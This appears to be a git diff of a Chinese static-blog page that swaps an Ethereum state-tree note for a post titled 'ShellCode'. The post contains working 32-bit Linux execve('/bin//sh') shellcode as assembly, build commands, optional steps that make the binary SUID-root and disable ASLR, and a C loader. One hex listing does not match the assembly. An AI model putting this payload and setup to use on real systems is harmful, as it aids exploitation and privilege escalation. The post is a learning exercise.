@@ -18,30 +18,22 @@
   <meta name="author" content="prelearn">
   <meta name="keywords" content="">
   
-    <meta name="description" content="状态数据结构 addr –&gt;state  余额证明 所有账户的哈希表。 构造默克尔树。 余额只是一种状态。 根据哈希值流程验证即可证明，因为根哈希是一定的在某个时间。  哈希表构造默克尔树不排序 默克尔书不唯一。  排序 代价太大，新建账户的代价太大。  trie(检索树)  输入不管，结果相同。 更新局部性比较强。 存储有点浪费。  PT压缩检索树  访问效率增加。 新增加点，节点可能需要">
+    <meta name="description" content="ubuntu(16 32位)概述什么是shellcodeshellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。 汇编码与机器码机器码可以直接在CPU运行的代码，一般就是可以用二">
 <meta property="og:type" content="article">
-<meta property="og:title" content="03-ETH-状态树">
-<meta property="og:url" content="https://prelearn-code.github.io/2024/07/25/03-ETH-%E7%8A%B6%E6%80%81%E6%A0%91/index.html">
+<meta property="og:title" content="ShellCode">
+<meta property="og:url" content="https://prelearn-code.github.io/2024/07/29/shellcode/index.html">
 <meta property="og:site_name" content="prelearn-code">
-<meta property="og:description" content="状态数据结构 addr –&gt;state  余额证明 所有账户的哈希表。 构造默克尔树。 余额只是一种状态。 根据哈希值流程验证即可证明，因为根哈希是一定的在某个时间。  哈希表构造默克尔树不排序 默克尔书不唯一。  排序 代价太大，新建账户的代价太大。  trie(检索树)  输入不管，结果相同。 更新局部性比较强。 存储有点浪费。  PT压缩检索树  访问效率增加。 新增加点，节点可能需要">
+<meta property="og:description" content="ubuntu(16 32位)概述什么是shellcodeshellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。 汇编码与机器码机器码可以直接在CPU运行的代码，一般就是可以用二">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://prelearn-code.github.io/pic/Pasted%20image%2020240725182117.png">
-<meta property="og:image" content="https://prelearn-code.github.io/pic/Pasted%20image%2020240725182211.png">
-<meta property="og:image" content="https://prelearn-code.github.io/pic/Pasted%20image%2020240725224548.png">
-<meta property="og:image" content="https://prelearn-code.github.io/pic/Pasted%20image%2020240725224916.png">
-<meta property="og:image" content="https://prelearn-code.github.io/pic/Pasted%20image%2020240725225444.png">
-<meta property="og:image" content="https://prelearn-code.github.io/pic/Pasted%20image%2020240725225711.png">
-<meta property="article:published_time" content="2024-07-25T15:15:20.000Z">
-<meta property="article:modified_time" content="2024-07-28T06:53:53.430Z">
+<meta property="article:published_time" content="2024-07-29T01:04:16.000Z">
+<meta property="article:modified_time" content="2024-07-29T15:13:41.419Z">
 <meta property="article:author" content="prelearn">
-<meta property="article:tag" content="BlockChain">
-<meta property="article:tag" content="ETH">
+<meta property="article:tag" content="CVE">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://prelearn-code.github.io/pic/Pasted%20image%2020240725182117.png">
   
   
   
-  <title>03-ETH-状态树 - prelearn-code</title>
+  <title>ShellCode - prelearn-code</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -207,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="03-ETH-状态树"></span>
+            <span id="subtitle" data-typed-text="ShellCode"></span>
           
         </div>
 
@@ -218,8 +210,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-07-25 23:15" pubdate>
-          2024年7月25日 晚上
+        <time datetime="2024-07-29 09:04" pubdate>
+          2024年7月29日 上午
         </time>
       </span>
     
@@ -230,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          322 字
+          482 字
         
       </span>
     
@@ -241,7 +233,7 @@
         
         
         
-          3 分钟
+          5 分钟
         
       </span>
     
@@ -278,67 +270,40 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">03-ETH-状态树</h1>
+            <h1 id="seo-header">ShellCode</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h1><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><ul>
-<li>addr –&gt;state</li>
-</ul>
-<h2 id="余额证明"><a href="#余额证明" class="headerlink" title="余额证明"></a>余额证明</h2><ul>
-<li>所有账户的哈希表。</li>
-<li>构造默克尔树。</li>
-<li>余额只是一种状态。</li>
-<li>根据哈希值流程验证即可证明，因为根哈希是一定的在某个时间。</li>
-</ul>
-<h3 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h3><h3 id="构造默克尔树"><a href="#构造默克尔树" class="headerlink" title="构造默克尔树"></a>构造默克尔树</h3><h4 id="不排序"><a href="#不排序" class="headerlink" title="不排序"></a>不排序</h4><ul>
-<li>默克尔书不唯一。</li>
-</ul>
-<h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><ul>
-<li>代价太大，新建账户的代价太大。</li>
-</ul>
-<h1 id="trie-检索树"><a href="#trie-检索树" class="headerlink" title="trie(检索树)"></a>trie(检索树)</h1><p><img src="/../pic/Pasted%20image%2020240725182117.png" srcset="/img/loading.gif" lazyload></p>
-<ul>
-<li>输入不管，结果相同。</li>
-<li>更新局部性比较强。</li>
-<li>存储有点浪费。</li>
-</ul>
-<h1 id="PT压缩检索树"><a href="#PT压缩检索树" class="headerlink" title="PT压缩检索树"></a>PT压缩检索树</h1><p><img src="/../pic/Pasted%20image%2020240725182211.png" srcset="/img/loading.gif" lazyload></p>
-<ul>
-<li>访问效率增加。</li>
-<li>新增加点，节点可能需要扩展。</li>
-<li>数据稀疏的时候压缩效果好。</li>
-<li>以太坊地址足够稀疏，160位。</li>
-</ul>
-<h1 id="MPT-默克尔压缩检索树"><a href="#MPT-默克尔压缩检索树" class="headerlink" title="MPT(默克尔压缩检索树)"></a>MPT(默克尔压缩检索树)</h1><ul>
-<li>哈希代替指针。</li>
-<li>进行压缩。</li>
-<li>可以证明账户不存在性。</li>
-</ul>
-<h1 id="MMPT-修改的默克尔压缩检索树"><a href="#MMPT-修改的默克尔压缩检索树" class="headerlink" title="MMPT(修改的默克尔压缩检索树)"></a>MMPT(修改的默克尔压缩检索树)</h1><p><img src="/../pic/Pasted%20image%2020240725224548.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/../pic/Pasted%20image%2020240725224916.png" srcset="/img/loading.gif" lazyload></p>
-<ul>
-<li>以哈希值存储。</li>
-<li>根哈希的值存储在块头节点。</li>
-<li>合约账户的信息存储也是小的MMPT。</li>
-<li>大部分的节点时共享的。</li>
-</ul>
-<h1 id="状态树的历史记录的保存"><a href="#状态树的历史记录的保存" class="headerlink" title="状态树的历史记录的保存"></a>状态树的历史记录的保存</h1><ul>
-<li>可能需要状态退回。</li>
-<li>维护历史记录。</li>
-<li>为了支持回滚。</li>
-</ul>
-<h1 id="区块头数据结构"><a href="#区块头数据结构" class="headerlink" title="区块头数据结构"></a>区块头数据结构</h1><p><img src="/../pic/Pasted%20image%2020240725225444.png" srcset="/img/loading.gif" lazyload></p>
-<ul>
-<li>root：账户状态树的根哈希。</li>
-<li>TxHash：</li>
-<li>ReciptHash：</li>
-</ul>
-<h1 id="块身的结构"><a href="#块身的结构" class="headerlink" title="块身的结构"></a>块身的结构</h1><p><img src="/../pic/Pasted%20image%2020240725225711.png" srcset="/img/loading.gif" lazyload></p>
-<h1 id="RLP-Recursive-Length-Profix"><a href="#RLP-Recursive-Length-Profix" class="headerlink" title="RLP(Recursive Length Profix)"></a>RLP(Recursive Length Profix)</h1><ul>
-<li>序列化value的值。</li>
-<li>只支持字符数组。</li>
+                <h1 id="ubuntu-16-32位"><a href="#ubuntu-16-32位" class="headerlink" title="ubuntu(16 32位)"></a>ubuntu(16 32位)</h1><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="什么是shellcode"><a href="#什么是shellcode" class="headerlink" title="什么是shellcode"></a>什么是shellcode</h2><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode<strong>机器码</strong>，让电脑可以执行攻击者的任意指令。</p>
+<h2 id="汇编码与机器码"><a href="#汇编码与机器码" class="headerlink" title="汇编码与机器码"></a>汇编码与机器码</h2><h3 id="机器码"><a href="#机器码" class="headerlink" title="机器码"></a>机器码</h3><p>可以直接在CPU运行的代码，一般就是可以用二进制代码来展示。</p>
+<h3 id="汇编码"><a href="#汇编码" class="headerlink" title="汇编码"></a>汇编码</h3><p>就是币机器码高级一点的语言，通过基本的语言实现操作系统的基础功能。</p>
+<h1 id="shellcode代码"><a href="#shellcode代码" class="headerlink" title="shellcode代码"></a>shellcode代码</h1><h2 id="汇编代码-目标机32bit的ubuntu16"><a href="#汇编代码-目标机32bit的ubuntu16" class="headerlink" title="汇编代码(目标机32bit的ubuntu16)"></a>汇编代码(目标机32bit的ubuntu16)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>section .text<br>    global _start<br><br>_start:<br>    xor eax, eax<br>    push eax<br>    push 0x68732f2f<br>    push 0x6e69622f<br>    mov ebx, esp<br>    push eax<br>    push ebx<br>    mov ecx, esp<br>    xor edx, edx<br>    mov al, 0xb<br>    int 0x80<br></code></pre></td></tr></table></figure>
+
+<h2 id="使用汇编码"><a href="#使用汇编码" class="headerlink" title="使用汇编码"></a>使用汇编码</h2><h3 id="1-上述代码保存为文件（shellcode-asm）"><a href="#1-上述代码保存为文件（shellcode-asm）" class="headerlink" title="1.上述代码保存为文件（shellcode.asm）"></a>1.上述代码保存为文件（shellcode.asm）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim shellcode.asm<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-进行汇编"><a href="#2-进行汇编" class="headerlink" title="2.进行汇编"></a>2.进行汇编</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nasm -f elf32 shellcode.asm -o shellcode.o<br></code></pre></td></tr></table></figure>
+<h3 id="3-进行链接"><a href="#3-进行链接" class="headerlink" title="3.进行链接"></a>3.进行链接</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ld -m elf_i386 shellcode.o -o shellcode<br></code></pre></td></tr></table></figure>
+
+<h3 id="4-设置SUID位（可选）"><a href="#4-设置SUID位（可选）" class="headerlink" title="4.设置SUID位（可选）"></a>4.<strong>设置SUID位（可选）</strong></h3><p>以root权限执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo chown root:root shellcode<br>sudo chmod u+s shellcode<br></code></pre></td></tr></table></figure>
+<h3 id="5-禁用ASLR（可选）"><a href="#5-禁用ASLR（可选）" class="headerlink" title="5.禁用ASLR（可选）"></a>5.<strong>禁用ASLR（可选）</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-运行可执行文件"><a href="#6-运行可执行文件" class="headerlink" title="6.运行可执行文件"></a>6.运行可执行文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./shellcode<br></code></pre></td></tr></table></figure>
+
+<h2 id="汇编代码转为机器码"><a href="#汇编代码转为机器码" class="headerlink" title="汇编代码转为机器码"></a>汇编代码转为机器码</h2><h3 id="编译为二进制文件"><a href="#编译为二进制文件" class="headerlink" title="编译为二进制文件"></a>编译为二进制文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nasm -f bin shellcode.asm -o shellcode.bin<br></code></pre></td></tr></table></figure>
+<h3 id="查看机器码并转为所需格式"><a href="#查看机器码并转为所需格式" class="headerlink" title="查看机器码并转为所需格式"></a>查看机器码并转为所需格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">xxd -p shellcode.bin | sed &#x27;s/\(..\)/\\x\1/g&#x27; | fold -w 48<br></code></pre></td></tr></table></figure>
+<h2 id="16进制机器码"><a href="#16进制机器码" class="headerlink" title="16进制机器码"></a>16进制机器码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">\x66\x31\xc0\x66\x50\x66\xbb\x2f\x2f\x73\x68\x66<br>\x53\x66\xbb\x2f\x62\x69\x6e\x66\x53\x66\x89\xe3<br>\x66\x50\x66\x53\x66\x89<br>\xe1\x66\x31\xd2\xb0\x0b\xcd\x80<br></code></pre></td></tr></table></figure>
+
+<h2 id="C语言使用机器码"><a href="#C语言使用机器码" class="headerlink" title="C语言使用机器码"></a>C语言使用机器码</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-comment">// Shellcode</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <br><span class="hljs-string">&quot;\x31\xc0\x50\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// Print shellcode length</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Shellcode Length: %ld\n&quot;</span>, <span class="hljs-built_in">strlen</span>(shellcode));<br><br>    <span class="hljs-comment">// Allocate executable memory</span><br>    <span class="hljs-type">void</span> *exec = mmap(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (exec == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Copy shellcode to allocated memory</span><br>    <span class="hljs-built_in">memcpy</span>(exec, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>    <span class="hljs-comment">// Execute shellcode</span><br>    <span class="hljs-type">void</span> (*execute_shellcode)() = (<span class="hljs-type">void</span> (*)())exec;<br>    execute_shellcode();<br><br>    <span class="hljs-comment">// Cleanup</span><br>    munmap(exec, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>使用 <code>-z execstack</code> 编译选项来允许执行堆栈上的代码:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -z execstack -o shellcode shellcode.c<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h2><ul>
+<li>开启shell窗口。</li>
 </ul>
 
                 
@@ -358,12 +323,12 @@
     
       <span class="category-chain">
         
-  <a href="/categories/BlockChain/" class="category-chain-item">BlockChain</a>
+  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
   
   
     <span>></span>
     
-  <a href="/categories/BlockChain/ETH/" class="category-chain-item">ETH</a>
+  <a href="/categories/CVE/CVE-2024-6387/" class="category-chain-item">CVE-2024-6387</a>
   
   
 
@@ -380,9 +345,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/BlockChain/" class="print-no-link">#BlockChain</a>
-      
-        <a href="/tags/ETH/" class="print-no-link">#ETH</a>
+        <a href="/tags/CVE/" class="print-no-link">#CVE</a>
       
     </div>
   
@@ -394,8 +357,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>03-ETH-状态树</div>
-      <div>https://prelearn-code.github.io/2024/07/25/03-ETH-状态树/</div>
+      <div>ShellCode</div>
+      <div>https://prelearn-code.github.io/2024/07/29/shellcode/</div>
     </div>
     <div class="license-meta">
       
@@ -407,13 +370,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年7月25日</div>
+          <div>2024年7月29日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2024年7月28日</div>
+          <div>2024年7月29日</div>
         </div>
       
       
@@ -444,9 +407,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/07/29/shellcode/" title="ShellCode">
+                      <a href="/2024/07/29/04-ETH-%E4%BA%A4%E6%98%93%E6%A0%91%E4%B8%8E%E6%94%B6%E6%8D%AE%E6%A0%91/" title="04-ETH-交易树与收据树">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ShellCode</span>
+                        <span class="hidden-mobile">04-ETH-交易树与收据树</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -454,8 +417,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/07/25/02-ETC-%E8%B4%A6%E6%88%B7/" title="02-ETC-账户">
-                        <span class="hidden-mobile">02-ETC-账户</span>
+                      <a href="/2024/07/25/03-ETH-%E7%8A%B6%E6%80%81%E6%A0%91/" title="03-ETH-状态树">
+                        <span class="hidden-mobile">03-ETH-状态树</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
